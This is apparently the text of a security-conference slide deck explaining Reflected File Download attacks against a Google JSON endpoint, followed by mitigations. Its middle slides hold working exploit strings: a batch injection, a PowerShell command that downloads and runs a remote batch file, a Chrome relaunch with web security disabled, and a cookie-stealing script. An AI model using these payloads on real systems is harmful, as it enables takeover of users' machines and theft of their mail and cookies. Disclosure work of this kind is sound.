The Web Model of Trust

The Web Model of Trust

The Web Model of Trust

How do we trust downloads?

TRUST?

WHICH ONE WOULD YOU TRUST?

WHAT MAKES YOU TRUST A DOWNLOAD?

Referrer
19%

Host
81%

4 OUT OF 5
WOULD TRUST DOWNLOADS
BASED ON THE HOSTING DOMAIN

RFD uses such trust to do evil!
RFD uses such trust to do evil!

RFD REAL EXAMPLE, STEP BY STEP…

Google Autocomplete

http://googlefails.tumblr.com/

http://googlefails.tumblr.com/

Google Autocomplete

User

https://google.com/s?q=rfd
https://google.com/s?q=rfd
https://google.com/s?q=rfd
https://google.com/s?q=rfd
https://google.com/s?q=rfd

HTTP/1.1 200 OK
HTTP/1.1 200 OK
Content-Type: application/json;
Content-Type: application/json;
Content-Disposition: attachment
Content-Disposition: attachment
Content-Length: 12…
Content-Length: 12…

{"results":["q", "rfd","I love rfd"]}
{"results":["q", "rfd","I love rfd"]}

Web Server

User

https://google.com/s?q=rfd"

HTTP/1.1 200 OK
Content-Type: application/json;
Content-Disposition: attachment
Content-Length: 12…

{"results":["q", "rfd\"","I love rfd"]}

Web Server

It’s all about the context…

It’s all about the context…

User

https://google.com/s?q=rfd"||calc||

HTTP/1.1 200 OK
Content-Type: application/json;
Content-Disposition: attachment
Content-Length: 12…

{"results":["q", "rfd\"||calc||","I love
rfd"]}

Web Server

{"results":["q", "rfd\"||calc||","I love rfd"]}
{"results":["q", "rfd\"||calc||","I love rfd"]}
{"results":["q", "rfd\"||calc||","I love rfd"]}

O
{"results":["q", "rfd\"||calc||","I love rfd"]}
R

F A L S E

{"results":["q", "rfd\"||calc||","I love rfd"]}
{"results":["q", "rfd\"||calc||","I love rfd"]}

{"results":["q", "rfd\"||calc||","I love rfd"]}

I G N O R E D

TRUE

O
R

User

https://google.com/s?q=rfd"||calc||

HTTP/1.1 200 OK
Content-Type: application/json;
Content-Disposition: attachment
Content-Length: 12…

{"results":["q", "rfd\"||calc||","I love
rfd"]}

Web Server

https://google.com/s;/setup.bat;?q=rfd"||calc||

User

Web Server

Setup.bat

HTTP/1.1 200 OK
Content-Type: application/json;
Content-Disposition: attachment
Content-Length: 12…

{"results":["q", "rfd\"||calc||","I love
rfd"]}

https://google.com/s;/setup.bat;?q=rfd"||calc||

User

Web Server

Setup.bat

HTTP/1.1 200 OK
Content-Type: application/json;
Content-Disposition: attachment
Content-Length: 12…

{"results":["q", "rfd\"||calc||","I love
rfd"]}

https://google.com/s;/setup.bat;?q=rfd"||calc||

User

Setup.bat

HTTP/1.1 200 OK
Content-Type: application/json;
Content-Disposition: attachment
Content-Length: 12…

{"results":["q", "rfd\"||calc||","I love
rfd"]}

Web Server

https://google.com/s;/setup.bat;?q=rfd"||calc||

User

Setup.bat

HTTP/1.1 200 OK
Content-Type: application/json;
Content-Disposition: attachment
Content-Length: 12…

{"results":["q", "rfd\"||calc||","I love
rfd"]}

Web Server

How come there are no warnings?

WINDOWS 7
SECURITY FEATURE BYPASS

How come there are no warnings?

• Windows 7 bypass for batch files
• Works for the “.bat” and “.cmd”

extensions.

• Completely disables all warnings!
• Files execute immediately

Its all in the filename!

• setup
• install
• update

VeryVeryBadUpdate.bat
VeryVeryBadUpdate.bat

RFD

RFD REQUIREMENTS
• REFLECTED – some input is reflected to
the response body. --> shell commands
• FILE – attacker can tamper the filename.
• DOWNLOAD – the response is

downloaded.

Where can we find RFD?
• Any response with reflected input and

less common Content-Type.

• JSON APIs and JSONP are extremely

vulnerable.

• URL Mapping is Permissive (‘/’ , ‘;’)

Which Exploit Should I Use?

• Use “.bat” and “.cmd” extensions for batch.
• Use “.js”, “jse”, ”.vbs”, ”.wsh”, “.vbe”, “.wsf”,

“.hta” for Windows Script Host fun.

• You can exploit other programs! E.g. “.pdf”

Batch tricks

• & - Command Separator
• && - AND
• | - Redirect Output
• || - OR
• > < >> << - Stream Redirects
• New Line

Force files to DOWNLOAD?

• Content-Disposition headers
• Chrome & Opera can force downloads using
<a download href=“http://target/setup.bat”>
• Different Browser behavior! (Content-Types)

Force files to download?

ADVANCED EXPLOITATION
• Do as you wish… you are running cmds in OS.
• Use PowerShell to download the rest of the
payload! (You can even ask for admin rights)

"||powershell (New-Object
Net.Webclient).DownloadFile("http://pi.vu/B2jC","5.bat")|md
||start /min 5

• Get back to Chrome with Super Powers!

How many command-line options?

Google Chrome

OVER NINE HUNDREEEEDD!

Let’s use just 2 out of 973…

• --disable-web-security

shuts down same-origin-policy!

• --disable-popup-blocker

well…

• Result: one big mess! YOU OWN CHROME!

User

3

User

4

User

1

http://www.google.com/s;/ChromeSetup.bat;?q=payload&...

ChromeSetup.bat

2

Windows Batch File

Google
Web Server

5

http://attacker-website.com/

6

<script>
win = open(“http://mail.google.com”);
alert(win.document.body); // granted
alert(win.document.cookie); //granted

Attacker
Web Server

Let’s create an exploit!

1 2

3

4 5 6

7

["\"||taskkill /F /IM ch*|md||start chrome pi.vu/B2jj --disable-web-security
--disable-popup-blocking||",[],{"t":{"bpc":false,"tlw":false},"q":"Xwxg4gmQoA9Zn6E2DjScDWXR
zbQ"}]

8

1

2

3

4

5

6

7

8

Result: '["\"' is not recognized as an internal or external command, operable program or batch file.

|| is the OR operator, since the left hand side failed, the right hand side will be executed.

Killing all tasks with names starting with “ch” – targeting “chrome.exe”. Chrome will be closed.

| redirects the input to the next command

The md command creates new directories. Its only use here is to cause the expression to be false.

|| same trick as before, continuing the execution since the last expression was false.

Starting Chrome at the attacker’s URL without Web security and popup blocking.

|| this time Chrome was started successfully, so the rest of the commands are ignored.

DEMO
Stealing emails from GMAIL

DEMO
Cross-Social Network RFD Worm

DEMO
Cross-Social Network RFD Worm

DEMO
Cross-Social Network RFD Worm

DEMO
Cross-Social Network RFD Worm

How to Fix RFD?

• Use exact URL mapping – no wildcards!
• Do not escape! Encode! \” \u0022 or \x22
• Add Content-Disposition w/ filename att.:
Content-Disposition: attachment; filename=1.txt

• Require Custom Headers for all APIs
• If possible use CSRF tokens

How to Fix RFD - more?

• Whitelist Callbacks – reflected by default!
• Enforce XSSI mitigation like for(;;);
• Never include user input in API usage errors.
• Remove support for Path Parameters

(semicolons)

• X-Content-Type-Options: nosniff

Summary

• Your site can be used to attack users!
• Attackers get full control of victims machine.
• A file is downloaded without being uploaded.
• Advanced exploitation (chrome/powershell)

and bypasses (windows).

• Fix it! I am so scared!

Who is responsible?

“We recognize that the address bar is the only

reliable security indicator in modern browsers.”

The Google Vulnerability Reward Program Rules

THANK YOU!
Follow Me:  @orenhafif
Follow Us:  @spiderlabs


